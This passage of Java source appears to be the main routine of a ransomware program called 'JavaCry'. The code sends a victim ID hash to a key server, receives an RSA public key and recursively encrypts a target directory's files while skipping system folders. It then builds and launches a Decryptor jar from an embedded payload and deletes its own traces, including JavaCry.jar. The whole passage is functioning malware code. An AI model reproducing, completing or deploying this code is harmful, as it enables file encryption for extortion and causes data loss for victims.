        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD
        String h = ""; // id hash to write to sendtome.txt

        KeyClient key_client = new KeyClient(addr, 6666);

        

        /*
         * =========================================================
         * Send victim ID and get public key
         * =========================================================
         */

        if (key_client.getSuccess()) {

            try {
                // send id hash to server
                MessageDigest md = MessageDigest.getInstance("SHA-256");
                byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                String b64hash = Base64.getEncoder().encodeToString(hash);
                h = b64hash;
                key_client.sendString(b64hash);

                // received allocated public key
                String b64pubkey = key_client.recvString();
                byte[] pub = Base64.getDecoder().decode(b64pubkey);
                X509EncodedKeySpec spec = new X509EncodedKeySpec(pub);
                KeyFactory factory = KeyFactory.getInstance("RSA");
                PublicKey public_key = factory.generatePublic(spec);

                crypto = new RSACrypt(public_key);

                key_client.close();
            }

            catch (Exception e) {
                System.out.println(1 + "" + e);
                return;
            }

            /*
             * =========================================================
             * Encrypting the files
             * =========================================================
             */

            File self = new File("JavaCry.jar");
            avoidDir.add(self.getAbsolutePath());
            avoidDir.add("JavaCry.jar");
            avoidDir.add("/windows");
            avoidDir.add("/library");
            avoidDir.add("/boot");
            avoidDir.add("/local");
            avoidDir.add("/program files");
            avoidDir.add("/programdata");
            avoidDir.add("/System");
            avoidDir.add("/Volumes");
            avoidDir.add("/dev");
            avoidDir.add("/etc");
            avoidDir.add("/bin");
            avoidDir.add("$");

            // list files recursively within the target directory
            try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
            }

            catch (Exception e) {
                ;
            }

            // avoid certain directories
            for (int i = 0; i < files.size(); i++) {

                if (avoidDir.contains(files.get(i).toString())) {
                    files.remove(i);
                    i--;
                }
            }

            // This will encrypt files recursively in the target directory
            encryptFiles();

            // This will securely save the AES encryption key by encrypting it with the
            // received RSA public key.
            crypto.SaveAESKey();

            /*
             * =========================================================
             * Generating Decryptor.java
             * =========================================================
             */

            try {
                File f = new File("Decryptor.java");

                if (!f.exists()) {
                    f.createNewFile();
                }

                File s = new File("sendtome.txt");

                if (!s.exists()) {
                    s.createNewFile();
                }

                File m = new File("manifest.txt");

                if (!m.exists()) {
                    m.createNewFile();
                }

                // create Decryptor.jar
                String code = new String(Base64.getDecoder().decode(decryptorPayload));
                code = replaceLine(code, 43, "private static int id = " + String.valueOf(id) + ";");
                FileWriter writer = new FileWriter("Decryptor.java");
                PrintStream manifest = new PrintStream(new File("manifest.txt"));
                manifest.println("Main-Class: Decryptor");
                writer.write(code);
                writer.close();

                // create sendtome.txt
                writer = new FileWriter("sendtome.txt");
                writer.write(h);
                writer.close();

                System.out.println("fetch loading.gif");
                // File loadingImg = new File("/img/loading.gif");
                InputStream imgStream = JavaCry.class.getResourceAsStream("/img/loading.gif");
                Files.copy(imgStream, Paths.get("loading.gif"), StandardCopyOption.REPLACE_EXISTING);

                /*
                 * =========================================================
                 * Compiling Decryptor.java
                 * =========================================================
                 */

                System.out.println("build decryptor");
                process = Runtime.getRuntime()
                        .exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String str;

                while ((str = b.readLine()) != null) {
                    System.out.println(str);
                }

                b.close();

                System.out.println("make jar file");
                process = Runtime.getRuntime().exec(String.format(
                        "jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class Decryptor$2.class ClientThread.class loading.gif",
                        System.getProperty("user.home")));
                b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((str = b.readLine()) != null) {
                    System.out.println(str);
                }

                b.close();
                /*
                 * =========================================================
                 * Deleting the files
                 * =========================================================
                 */

                if (f.delete()) {
                    System.out.println("Deleted the file: " + f.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                if (m.delete()) {
                    System.out.println("Deleted the file: " + m.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File classFile = new File("Decryptor.class");

                if (classFile.delete()) {
                    System.out.println("Deleted the file: " + classFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File helperFile = new File("Decryptor$1.class");

                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile = new File("ClientThread.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile = new File("Decryptor$2.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: " + helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File loadingImg = new File("loading.gif");
                if (loadingImg.delete()) {
                    System.out.println("Deleted the file: " + loadingImg.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                self = new File("JavaCry.jar");

                if (self.exists()) {
                    self.delete();
                }

                System.out.println("Done, running Decryptor");

                /*
                 * =========================================================
                 * Running Decryptor.jar
                 * =========================================================
                 */
                process = Runtime.getRuntime()
                        .exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

            }

            catch (Exception e) {
                System.out.println(2 + "" + e);
            }

        }
    }
}
